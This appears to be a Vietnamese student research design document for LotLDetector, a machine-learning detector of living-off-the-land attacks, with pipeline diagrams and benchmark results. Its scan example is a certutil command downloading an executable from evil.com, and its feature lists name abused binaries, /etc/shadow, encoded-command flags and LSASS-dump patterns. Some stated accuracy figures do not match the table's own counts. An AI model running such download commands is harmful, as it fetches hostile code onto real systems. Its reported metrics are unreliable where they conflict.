# KIẾN TRÚC VÀ SƠ ĐỒ HOẠT ĐỘNG HỆ THỐNG LOTLDETECTOR
> **Living off the Land (LotL) Attack Detection System using Hybrid Machine Learning & NLP**  
> *Học viện Kỹ thuật Mật mã (KMA) — Đề tài Nghiên cứu Ứng dụng Học máy trong Phát hiện Tấn công Living off the Land*

---

## 1. TỔNG QUAN KIẾN TRÚC TOÀN HỆ THỐNG (HIGH-LEVEL ARCHITECTURE)

Hệ thống **LotLDetector** hoạt động theo mô hình **Kiến trúc Lai (Hybrid Architecture)**, kết hợp giữa:
1. **Quy tắc Chuyên gia & Cẩm nang Tri thức An ninh Toàn cầu** (Expert Rules + Global Domain Knowledge Base: LOLBAS / GTFOBins / MITRE ATT&CK).
2. **Xử lý Ngôn ngữ Tự nhiên & Đo độ tương đồng cú pháp** (NLP: Sentence BLEU token n-gram matching).
3. **Mô hình Học máy Cổ điển Phân tán** (Classical Machine Learning: Tree-based Random Forest Classifier với cơ chế Cân bằng Trọng số Lớp).

```mermaid
graph TD
    classDef inputStyle fill:#1e293b,stroke:#3b82f6,stroke-width:2px,color:#fff;
    classDef prepStyle fill:#0f172a,stroke:#64748b,stroke-width:2px,color:#fff;
    classDef featStyle fill:#0c4a6e,stroke:#0284c7,stroke-width:2px,color:#fff;
    classDef mlStyle fill:#14532d,stroke:#22c55e,stroke-width:2px,color:#fff;
    classDef outStyle fill:#450a0a,stroke:#ef4444,stroke-width:2px,color:#fff;
    classDef goodStyle fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff;

    IN["📥 INPUT: Dòng lệnh thô (Raw Command Line)<br/><i>CMD, PowerShell, hoặc Linux Bash</i>"]:::inputStyle

    subgraph PREP["BƯỚC 1: TIỀN XỬ LÝ & KHỬ LÀM RỐI (PREPROCESSING & DEOBFUSCATION)"]
        NORM["Khử làm rối dấu mũ: deobfuscate_cmd()<br/><i>c^e^r^t^u^t^i^l → certutil</i>"]
        IP["Chuẩn hóa & Gán nhãn địa chỉ IP: extract_ip_labels()<br/><i>IP_LOOPBACK, IP_PRIVATE, IP_PUBLIC...</i>"]
        TOK["Tách từ theo nền tảng: Platform Tokenizer<br/><i>Windows: split_windows() | Linux: split_linux()</i>"]
    end

    subgraph FEAT["BƯỚC 2: TRÍCH XUẤT ĐẶC TRƯNG LAI (HYBRID FEATURE PIPELINE)"]
        F_CMD["🏷️ COMMAND: Nhận diện LOLBins/GTFOBins<br/><i>certutil, wmic, rundll32, curl, tar, nc...</i>"]
        F_PATH["🏷️ PATH: Kiểm tra đường dẫn nhạy cảm<br/><i>System32, SysWOW64, /etc/shadow, /bin/sh...</i>"]
        F_KW["🏷️ KEYWORD: Nhận diện tham số rủi ro<br/><i>-urlcache, -split, -enc, DownloadFile...</i>"]
        F_REG["🏷️ REGEX: So khớp 5 cụm hành vi tấn công<br/><i>Download, Proxy Exec, LSASS Dump, Anti-Forensics...</i>"]
        
        CORPUS[("📚 External Knowledge Base<br/>cmd_known.corpus / bash_known.corpus<br/><i>(LOLBAS & GTFOBins PoC)</i>")]
        F_BLEU["🏷️ NLP BLEU: SimilarityMatcher<br/><i>So khớp n-gram cú pháp (Threshold > 0.5)<br/>→ Gán nhãn LOOKS_LIKE_KNOWN_LOL</i>"]
        CORPUS -.-> F_BLEU
    end

    subgraph VEC["BƯỚC 3: MÃ HÓA VECTOR (VECTORIZATION)"]
        CV["Mã hóa Túi đặc trưng: CountVectorizer<br/><i>Vector đặc trưng thưa (Sparse Binary Vector)</i>"]
    end

    subgraph ML["BƯỚC 4: HỌC MÁY PHÂN LOẠI (RANDOM FOREST ENGINE)"]
        RF["Random Forest Classifier (100 Decision Trees)<br/><i>class_weight='balanced'</i>"]
        PROB["Tính toán Phân bố Xác suất Tấn công<br/><i>predict_proba() → P(Malicious)</i>"]
    end

    subgraph DECIDE["BƯỚC 5: BỘ HIỆU CHUẨN NGƯỠNG QUYẾT ĐỊNH (DECISION ENGINE)"]
        TH_CHECK{"Hiệu chuẩn Ngưỡng tối ưu:<br/><i>Windows: P ≥ 0.35 ?<br/>Linux: P ≥ 0.60 ?</i>"}
        FEW_CHECK{"Kiểm tra số lượng nhãn<br/><i>len(labels) < 1 ?</i>"}
    end

    OUT_BAD["⚠️ KẾT QUẢ: BAD<br/><i>Phát hiện tấn công LotL!<br/>Kèm độ tin cậy và giải thích đặc trưng</i>"]:::outStyle
    OUT_GOOD["✅ KẾT QUẢ: GOOD<br/><i>Lệnh lành tính / Thao tác quản trị</i>"]:::goodStyle
    OUT_NEU["❓ KẾT QUẢ: NEUTRAL<br/><i>Lệnh không đủ dấu hiệu nguy hại</i>"]:::inputStyle

    IN --> NORM --> IP --> TOK
    TOK --> F_CMD & F_PATH & F_KW & F_REG & F_BLEU
    F_CMD & F_PATH & F_KW & F_REG & F_BLEU --> CV
    CV --> RF --> PROB --> TH_CHECK
    
    TH_CHECK -- "Vượt ngưỡng hoặc trùng mẫu BLEU" --> OUT_BAD
    TH_CHECK -- "Không vượt ngưỡng" --> FEW_CHECK
    FEW_CHECK -- "Không có đặc trưng nhận diện" --> OUT_NEU
    FEW_CHECK -- "Có đặc trưng lành tính" --> OUT_GOOD
```

---

## 2. QUY TRÌNH TIỀN XỬ LÝ VÀ CHUẨN BỊ DỮ LIỆU (DATA PREPARATION PIPELINE)

Quy trình thu thập, làm sạch và chia tách dữ liệu thực hiện độc lập qua script `scripts/01_prepare_dataset.py`.

```mermaid
flowchart TD
    subgraph SOURCES_WIN["NGUỒN DỮ LIỆU WINDOWS (DATA SOURCES)"]
        S1["Scheduled Tasks (120+ lệnh hệ thống)"]
        S2["Windows Services (184+ lệnh dịch vụ)"]
        S3["Log EDR Sysmon Event ID 1 (328+ lệnh)"]
        S4["Lịch sử PSReadLine & Sysadmin (764+ lệnh)"]
        S5["Atomic Red Team & LOLBAS Attacks (490 lệnh)"]
    end

    subgraph SOURCES_LINUX["NGUỒN DỮ LIỆU LINUX"]
        L1["Adobe Cloud Production Logs (6,829 lệnh)"]
        L2["GTFOBins & Cloud Escapes (666 lệnh)"]
    end

    RAW_WIN["📁 master_windows.csv<br/><i>2,121 mẫu (1,631 good | 490 bad)</i>"]
    RAW_LINUX["📁 train_val.csv<br/><i>7,495 mẫu (6,829 good | 666 bad)</i>"]

    SOURCES_WIN --> RAW_WIN
    SOURCES_LINUX --> RAW_LINUX

    subgraph PREPARE_SCRIPT["01_prepare_dataset.py"]
        CLEAN["Làm sạch dữ liệu:<br/>• Chuẩn hóa cột (commands, tag)<br/>• Loại bỏ dòng trống, null, ký tự rác<br/>• Loại bỏ mẫu lệnh trùng lặp (deduplication)"]
        SPLIT["Phân tầng Stratified Split (80% / 10% / 10%):<br/>• Bảo toàn tuyệt đối tỷ lệ Good/Bad giữa các tập<br/>• Random Seed = 42"]
    end

    RAW_WIN --> CLEAN
    RAW_LINUX --> CLEAN
    CLEAN --> SPLIT

    SPLIT --> WIN_TRAIN["📁 data/processed/windows/train.csv (1,696 mẫu)"]
    SPLIT --> WIN_VAL["📁 data/processed/windows/val.csv (212 mẫu)"]
    SPLIT --> WIN_TEST["📁 data/processed/windows/test.csv (213 mẫu)"]

    SPLIT --> LIN_TRAIN["📁 data/processed/linux/train.csv (5,996 mẫu)"]
    SPLIT --> LIN_VAL["📁 data/processed/linux/val.csv (749 mẫu)"]
    SPLIT --> LIN_TEST["📁 data/processed/linux/test.csv (750 mẫu)"]
```

---

## 3. QUY TRÌNH HUẤN LUYỆN MÔ HÌNH (MODEL TRAINING PIPELINE)

Thực hiện thông qua `scripts/02_train.py` nạp module `src/models/trainer.py`.

```mermaid
sequenceDiagram
    autonumber
    participant D as Dữ liệu Huấn luyện (train.csv)
    participant P as Feature Pipeline (Windows/Linux)
    participant V as CountVectorizer
    participant RF as RandomForestClassifier
    participant M as Đánh giá Kiểm chuẩn (val.csv)
    participant S as Lưu trữ Artifacts (models/)

    Note over D,P: Bước 1: Trích xuất đặc trưng hàng loạt
    D->>P: Đọc dòng lệnh và nhãn (good: 0 / bad: 1)
    Note over P: training=True (Bỏ qua so sánh BLEU để tăng tốc huấn luyện 50x)
    P->>P: Áp dụng Normalizer + Regex + Keywords + Paths + Commands
    P-->>V: Danh sách chuỗi đặc trưng: "COMMAND_CERTUTIL certutil_downloader..."

    Note over V,RF: Bước 2: Mã hóa & Huấn luyện
    V->>V: fit_transform(x_train) → Sinh từ điển từ vựng (Vocabulary)
    V->>RF: Ma trận thưa đặc trưng (Sparse Matrix X) + Vector nhãn (y)
    RF->>RF: Huấn luyện 100 Decision Trees với class_weight='balanced'
    
    Note over RF,M: Bước 3: Đánh giá Kiểm chuẩn trên Val Set
    M->>P: Trích xuất đặc trưng tập val.csv (training=False: Bật so sánh BLEU)
    P->>V: transform(x_val)
    V->>RF: Dự đoán nhãn & xác suất trên x_val
    RF-->>M: Tính toán Accuracy, Precision, Recall, F1-Score, Confusion Matrix

    Note over M,S: Bước 4: Đóng gói và Xuất Model
    M->>S: joblib.dump(classifier, "rf_classifier.joblib")
    M->>S: joblib.dump(vectorizer, "vectorizer.joblib")
    M->>S: json.dump(top_features + metrics, "feature_config.json")
```

---

## 4. QUY TRÌNH SUY LUẬN & QUÉT THỜI GIAN THỰC (REAL-TIME SCAN INFERENCE)

Thực hiện thông qua `scripts/03_scan_cmd.py` nạp module `src/models/predictor.py`.

```mermaid
sequenceDiagram
    autonumber
    actor User as SOC Analyst / Hệ thống EDR
    participant CLI as 03_scan_cmd.py
    participant Pred as LotLPredictor
    participant Norm as Normalizer & Tokenizer
    participant Pipe as FeaturePipeline
    participant Sim as SimilarityMatcher (BLEU)
    participant Vec as CountVectorizer
    participant RF as RandomForest
    participant Dec as Decision Engine

    User->>CLI: Quét lệnh: certutil.exe -urlcache -f http://evil.com/a.exe
    CLI->>Pred: predict(command, platform="windows", threshold=0.35)
    
    Pred->>Norm: deobfuscate_cmd() & extract_ip_labels()
    Norm-->>Pipe: Lệnh đã khử làm rối + Nhãn IP

    par Trích xuất Tri thức chuyên gia
        Pipe->>Pipe: Kiểm tra LOLBins, Paths, Keywords, Regex
    and So khớp Độ tương đồng Cú pháp
        Pipe->>Sim: is_similar(command, threshold=0.5)
        Sim->>Sim: So khớp token 4-gram BLEU với cmd_known.corpus
        Sim-->>Pipe: BLEU > 0.5 → Bổ sung nhãn LOOKS_LIKE_KNOWN_LOL
    end

    Pipe-->>Pred: Danh sách đặc trưng hoàn chỉnh
    Pred->>Vec: transform(["COMMAND_CERTUTIL certutil_downloader..."])
    Vec-->>RF: Vector thưa đặc trưng
    RF-->>Dec: Xác suất là tấn công P(Malicious) = 0.9643

    Dec->>Dec: So sánh P với Threshold (0.35) & Nhãn BLEU
    Dec-->>CLI: Verdict = "BAD" | Probability = 96.43% | Features = [...]
    CLI-->>User: ⚠️ BAD (Phát hiện tấn công LotL! - 96.43%)
```

---

## 5. PHÂN BỔ BỘ LUẬT VÀ ĐẶC TRƯNG NHẬN DIỆN (FEATURE TAXONOMY)

```mermaid
classDiagram
    class RawCommandLine {
        +String raw_string
    }

    class Normalizer {
        +deobfuscate_cmd()
        +extract_ip_labels()
        +split_windows()
        +split_linux()
    }

    class FeatureLabels {
        +IP_LABELS: LOOPBACK, PRIVATE, PUBLIC...
        +PATH_LABELS: System32, SysWOW64, /etc/shadow...
        +COMMAND_LABELS: certutil, wmic, rundll32, curl...
        +KEYWORD_LABELS: -urlcache, -split, -enc...
        +REGEX_LABELS: 5 Chunks of Behavioral Signatures
        +NLP_LABEL: LOOKS_LIKE_KNOWN_LOL
    }

    class MachineLearningModel {
        +CountVectorizer vectorizer
        +RandomForestClassifier classifier
        +Float decision_threshold
        +predict()
        +predict_proba()
    }

    class SecurityVerdict {
        +String command
        +String verdict: BAD / GOOD / NEUTRAL
        +Float probability
        +List~String~ features_attributed
    }

    RawCommandLine --> Normalizer
    Normalizer --> FeatureLabels
    FeatureLabels --> MachineLearningModel
    MachineLearningModel --> SecurityVerdict
```

---

## 6. BẢNG HIỆU NĂNG THỰC NGHIỆM ĐẠT ĐƯỢC (BENCHMARK RESULTS)

Đánh giá hoàn toàn trên tập **Unseen Test Set** (Tập kiểm thử độc lập, không tham gia vào quá trình huấn luyện và điều chỉnh siêu tham số):

| Chỉ số đánh giá | Mô hình Windows (`models/windows`) | Mô hình Linux (`models/linux`) |
| :--- | :---: | :---: |
| **Quy mô tập Test độc lập** | **213 mẫu lệnh** (164 Good, 49 Bad) | **750 mẫu lệnh** (683 Good, 67 Bad) |
| **Độ chính xác toàn diện (Accuracy)** | **95.31%** | **95.47%** |
| **Khả năng bắt tấn công (Recall - Bad)** | **91.84%** *(Bắt trúng 45 / 49 cuộc tấn công)* | **71.64%** *(Bắt trúng 48 / 67 cuộc tấn công)* |
| **Độ chuẩn xác cảnh báo (Precision - Bad)** | **86.54%** *(Ít cảnh báo giả)* | **73.85%** *(Kiểm soát tốt Alert Fatigue)* |
| **F1-Score lớp Tấn công (Minority F1)** | **0.8911** | **0.7273** |
| **Độ chuẩn xác lệnh Lành tính (Good Precision)** | **97.52%** *(157 / 161 lệnh)* | **97.23%** *(666 / 685 lệnh)* |
| **Weighted F1-Score** | **0.9500** | **0.9500** |
| **Ngưỡng quyết định tối ưu ($Th$)** | **0.35** | **0.60** |
| **Cơ chế Tiền xử lý** | Khử làm rối dấu `^`, gán nhãn 7 dải IP | Tokenize POSIX, gán nhãn IP, GTFOBins |
| **Thuật toán ML cốt lõi** | Random Forest (100 cây, class_weight) | Random Forest (100 cây, class_weight) |

